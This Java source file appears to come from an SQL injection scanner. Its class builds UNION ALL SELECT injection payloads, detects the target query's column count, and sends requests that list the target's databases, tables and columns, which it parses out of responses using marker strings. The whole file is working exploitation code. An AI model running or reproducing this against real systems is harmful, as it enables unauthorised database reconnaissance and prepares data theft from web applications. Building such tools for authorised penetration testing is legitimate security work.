package com.vaccine.enumeration;

import com.vaccine.core.ScanContext;
import com.vaccine.db.dialect.DbmsDialect;
import com.vaccine.http.HttpResponseSnapshot;
import com.vaccine.model.Parameter;
import com.vaccine.model.ScanResult;
import com.vaccine.model.Target;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DialectBasedEnumerator implements UnionBasedEnumerator {

    private static final String DB_START = "VACCINE_DB_START_";
    private static final String DB_END = "_VACCINE_DB_END";

    private static final String TBL_START = "VACCINE_TBL_START_";
    private static final String TBL_END = "_VACCINE_TBL_END";

    private static final String COL_START = "VACCINE_COL_START_";
    private static final String COL_END = "_VACCINE_COL_END";

    private static final String COLCOUNT_MARKER = "VACCINE_COLCOUNT_MARK";
    private static final int MAX_COLUMNS = 8;

    @Override
    public void enumerate(ScanContext context, ScanResult result, Target target, Parameter vulnParam) {
        DbmsDialect dialect = context.getDialect();
        if (dialect == null) {
            return;
        }

        // 1) Detect column count
        int colCount = detectColumnCount(context, target, vulnParam);
        System.out.println("[*] Detected column count for enumeration: " + colCount);
        if (colCount <= 0) {
            System.out.println("[!] Cannot enumerate: column count detection failed");
            return;
        }

        // 2) Enumerate databases using dialect
        System.out.println("[*] Enumerating databases...");
        List<String> databases = enumerateDatabases(context, target, vulnParam, colCount, dialect);
        databases.forEach(result::addDatabaseName);

        // 3) Enumerate tables and columns for each database
        for (String db : databases) {
            System.out.println("[*] Enumerating tables in database: " + db);
            List<String> tables = enumerateTables(context, target, vulnParam, colCount, dialect, db);
            for (String table : tables) {
                result.addTableName(db, table);
            }

            for (String table : tables) {
                System.out.println("[*] Enumerating columns in table: " + db + "." + table);
                List<String> cols = enumerateColumns(context, target, vulnParam, colCount, dialect, db, table);
                for (String col : cols) {
                    result.addColumnName(db, table, col);
                }
            }
        }
    }

    private int detectColumnCount(ScanContext context, Target target, Parameter param) {
        for (int cols = 1; cols <= MAX_COLUMNS; cols++) {
            String expr = "'" + COLCOUNT_MARKER + "'";
            String payload = buildUnionPayload(param.getValue(), cols, expr);

            HttpResponseSnapshot resp = context.getHttpClient().send(
                    target.toInjectedRequest(param, payload));

            if (resp != null && resp.getBody() != null && resp.getBody().contains(COLCOUNT_MARKER)) {
                return cols;
            }
        }
        return -1;
    }

    private List<String> enumerateDatabases(ScanContext context,
                                            Target target,
                                            Parameter param,
                                            int colCount,
                                            DbmsDialect dialect) {

        // Use the dialect-specific query as a subquery and wrap results with markers
        String dialectQuery = dialect.listDatabasesQuery();
        System.out.println("[DEBUG] Dialect query: " + dialectQuery);

        String markedExpr = wrapWithMarkers(dialect, dialectQuery, DB_START, DB_END);
        System.out.println("[DEBUG] Marked expression: " + markedExpr);

        List<String> results = executeMarkedQuery(context, target, param, colCount, markedExpr, DB_START, DB_END);

        System.out.println("[*] Found databases: " + results);
        return results;
    }

    private List<String> enumerateTables(ScanContext context,
                                         Target target,
                                         Parameter param,
                                         int colCount,
                                         DbmsDialect dialect,
                                         String dbName) {

        // Use the dialect-specific query as a subquery and wrap results with markers
        String dialectQuery = dialect.listTablesQuery(dbName);
        String markedExpr = wrapWithMarkers(dialect, dialectQuery, TBL_START, TBL_END);

        return executeMarkedQuery(context, target, param, colCount, markedExpr, TBL_START, TBL_END);
    }

    private List<String> enumerateColumns(ScanContext context,
                                          Target target,
                                          Parameter param,
                                          int colCount,
                                          DbmsDialect dialect,
                                          String dbName,
                                          String tableName) {

        // Use the dialect-specific query as a subquery and wrap results with markers
        String dialectQuery = dialect.listColumnsQuery(dbName, tableName);
        String markedExpr = wrapWithMarkers(dialect, dialectQuery, COL_START, COL_END);

        return executeMarkedQuery(context, target, param, colCount, markedExpr, COL_START, COL_END);
    }

    private String wrapWithMarkers(DbmsDialect dialect, String subquery, String startMarker, String endMarker) {
        // Extract the column name from the dialect query
        String columnName = extractColumnName(subquery);

        // Build the CONCAT expression
        String concatExpr = buildConcatExpression(dialect, columnName, startMarker, endMarker);

        // Replace the column name in the original query with the concat expression
        // This is a simple approach that works for our standardized dialect queries
        return subquery.replace("SELECT " + columnName, "SELECT " + concatExpr);
    }

    private String extractColumnName(String query) {
        String trimmed = query.trim();
        int selectIdx = trimmed.toUpperCase().indexOf("SELECT");
        int fromIdx = trimmed.toUpperCase().indexOf("FROM");

        if (selectIdx != -1 && fromIdx != -1) {
            return trimmed.substring(selectIdx + 6, fromIdx).trim();
        }

        // Fallback
        return "col";
    }

    private String buildConcatExpression(DbmsDialect dialect, String columnName, String startMarker, String endMarker) {
        return switch (dialect.getDbmsType()) {
            case POSTGRESQL -> "'" + startMarker + "' || " + columnName + " || '" + endMarker + "'";
            default -> "CONCAT('" + startMarker + "', " + columnName + ", '" + endMarker + "')";
        };
    }

    private List<String> executeMarkedQuery(ScanContext context,
                                             Target target,
                                             Parameter param,
                                             int colCount,
                                             String markedQuery,
                                             String startMarker,
                                             String endMarker) {

        // The markedQuery is already a complete SELECT with CONCAT/|| wrapping the results
        // Extract just the SELECT expression (everything before FROM) and FROM clause
        int fromIdx = markedQuery.toUpperCase().indexOf(" FROM ");
        if (fromIdx == -1) {
            return List.of();
        }

        String selectPart = markedQuery.substring(0, fromIdx).trim();
        // Remove "SELECT " prefix to get just the expression
        if (selectPart.toUpperCase().startsWith("SELECT ")) {
            selectPart = selectPart.substring(7).trim();
        }

        String fromClause = " " + markedQuery.substring(fromIdx).trim();

        String payload = buildUnionPayloadWithFrom(param.getValue(), colCount, selectPart, fromClause);
        System.out.println("[DEBUG] Param value: '" + param.getValue() + "'");
        System.out.println("[DEBUG] Final SQL payload: " + payload);

        HttpResponseSnapshot resp = context.getHttpClient().send(
                target.toInjectedRequest(param, payload));

        if (resp == null || resp.getBody() == null) {
            return List.of();
        }

        String body = resp.getBody();
        int startIdx = body.indexOf(startMarker);
        if (startIdx != -1) {
            int contextStart = Math.max(0, startIdx - 50);
            int contextEnd = Math.min(body.length(), startIdx + 150);
            System.out.println("[DEBUG] Found marker at index " + startIdx + ", context: " +
                body.substring(contextStart, contextEnd).replaceAll("\\s+", " "));
        } else {
            System.out.println("[DEBUG] Marker '" + startMarker + "' NOT FOUND in response");
            int debugLen = Math.min(1000, body.length());
            System.out.println("[DEBUG] Response starts: " + body.substring(0, debugLen).replaceAll("\\s+", " "));
        }

        return extractMarkers(resp.getBody(), startMarker, endMarker);
    }

    private String buildUnionPayload(String originalValue, int columnCount, String firstColumnExpression) {
        StringBuilder sb = new StringBuilder("' UNION ALL SELECT ");
        sb.append(firstColumnExpression);
        sb.append(", NULL".repeat(Math.max(0, columnCount - 1)));
        sb.append(" -- ");

        if (originalValue == null || originalValue.isEmpty()) {
            return sb.toString();
        }
        return originalValue + sb;
    }

    private String buildUnionPayloadWithFrom(String originalValue, int columnCount, String selectExpression, String fromClause) {
        StringBuilder sb = new StringBuilder("' UNION ALL SELECT ");
        sb.append(selectExpression);
        sb.append(", NULL".repeat(Math.max(0, columnCount - 1)));
        sb.append(fromClause);
        sb.append(" -- ");

        if (originalValue == null || originalValue.isEmpty()) {
            return sb.toString();
        }
        return originalValue + sb;
    }

    private List<String> extractMarkers(String body, String startMarker, String endMarker) {
        List<String> results = new ArrayList<>();
        String regex = Pattern.quote(startMarker) + "(.*?)" + Pattern.quote(endMarker);

        Matcher matcher = Pattern.compile(regex).matcher(body);
        while (matcher.find()) {
            String value = matcher.group(1);
            if (!results.contains(value)) {
                results.add(value);
            }
        }
        return results;
    }
}

